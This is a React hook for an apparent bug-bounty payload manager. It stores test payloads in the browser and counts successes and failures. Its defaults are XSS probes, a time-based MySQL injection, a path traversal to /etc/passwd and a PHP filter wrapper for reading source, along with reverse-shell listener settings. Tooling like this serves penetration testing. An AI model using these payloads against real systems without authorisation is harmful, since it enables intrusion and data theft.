import { useState, useEffect } from "react";
import { COMMUNITY_PAYLOADS } from "../data/communityPayloads";

const PAYLOADS_STORAGE_KEY = "bbcl_payloads";
const SETTINGS_STORAGE_KEY = "bbcl_payload_settings";

const DEFAULT_PAYLOADS = [
  { id: 1, name: "Basic XSS Alert", category: "XSS", content: "<script>alert(1)</script>", successCount: 0, failCount: 0 },
  { id: 2, name: "XSS Image Error", category: "XSS", content: "<img src=x onerror=alert(1)>", successCount: 0, failCount: 0 },
  { id: 3, name: "SQLi Time Based (MySQL)", category: "SQLi", content: "' OR SLEEP(5)--", successCount: 0, failCount: 0 },
  { id: 4, name: "LFI Basic", category: "LFI", content: "../../../../etc/passwd", successCount: 0, failCount: 0 },
  { id: 5, name: "LFI Wrapper (PHP)", category: "LFI", content: "php://filter/convert.base64-encode/resource=index.php", successCount: 0, failCount: 0 },
];

export default function usePayloads() {
  const [payloads, setPayloads] = useState(() => {
    try {
      const saved = localStorage.getItem(PAYLOADS_STORAGE_KEY);
      return saved ? JSON.parse(saved) : DEFAULT_PAYLOADS;
    } catch {
      return DEFAULT_PAYLOADS;
    }
  });

  const [settings, setSettings] = useState(() => {
    try {
      const saved = localStorage.getItem(SETTINGS_STORAGE_KEY);
      return saved ? JSON.parse(saved) : { ip: "10.10.10.10", port: "4444" };
    } catch {
      return { ip: "10.10.10.10", port: "4444" };
    }
  });

  useEffect(() => {
    localStorage.setItem(PAYLOADS_STORAGE_KEY, JSON.stringify(payloads));
  }, [payloads]);

  useEffect(() => {
    localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(settings));
  }, [settings]);

  const updateSettings = (ip, port) => {
    setSettings({ ip, port });
  };

  const addPayload = (name, category, content) => {
    const newPayload = { id: Date.now().toString(), name, category, content, successCount: 0, failCount: 0 };
    setPayloads((prev) => [...prev, newPayload]);
  };

  const deletePayload = (id) => {
    setPayloads((prev) => prev.filter((p) => p.id !== id));
  };

  const incrementSuccess = (id) => {
    setPayloads((prev) => prev.map((p) => p.id === id ? { ...p, successCount: (p.successCount || 0) + 1 } : p));
  };

  const incrementFail = (id) => {
    setPayloads((prev) => prev.map((p) => p.id === id ? { ...p, failCount: (p.failCount || 0) + 1 } : p));
  };

  const syncCommunityPayloads = () => {
    setPayloads((prev) => {
      const existingIds = new Set(prev.map((p) => p.id));
      const newCommunity = COMMUNITY_PAYLOADS.filter((p) => !existingIds.has(p.id)).map(p => ({
        ...p,
        successCount: 0,
        failCount: 0
      }));
      return [...prev, ...newCommunity];
    });
  };

  return {
    payloads,
    settings,
    updateSettings,
    addPayload,
    deletePayload,
    incrementSuccess,
    incrementFail,
    syncCommunityPayloads,
  };
}
